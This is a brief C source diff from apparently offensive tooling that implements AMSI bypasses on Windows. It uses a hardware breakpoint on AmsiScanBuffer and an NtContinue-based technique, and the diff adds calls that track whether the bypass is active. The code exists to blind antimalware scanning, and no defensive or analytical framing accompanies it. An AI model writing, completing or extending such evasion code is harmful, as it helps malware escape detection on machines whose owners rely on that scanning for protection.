@@ -300,6 +300,7 @@ BOOL Stealth_PatchAMSI_HardwareBreakpoint(void)
     }
 
     g_AmsiBypassActive = TRUE;
+    Stealth_SetAmsiBypassState(TRUE);
     Stealth_DebugPrintfA("AMSI hardware breakpoint active at %p", g_AmsiScanBufferAddress);
 
     // Keep amsi.dll loaded (don't FreeLibrary)
@@ -321,6 +322,7 @@ VOID Stealth_CleanupAMSIBypass(void)
     ClearHardwareBreakpointAllThreads();
     g_AmsiScanBufferAddress = NULL;
     g_AmsiBypassActive = FALSE;
+    Stealth_SetAmsiBypassState(FALSE);
 }
 
 // ================================================================
@@ -401,6 +403,7 @@ BOOL Stealth_PatchAMSI_NtContinue(void)
     if (NT_SUCCESS(status))
     {
         g_AmsiBypassActive = TRUE;
+        Stealth_SetAmsiBypassState(TRUE);
         Stealth_DebugPrintfA("AMSI NtContinue bypass active at %p", g_AmsiScanBufferAddress);
         return TRUE;
     }
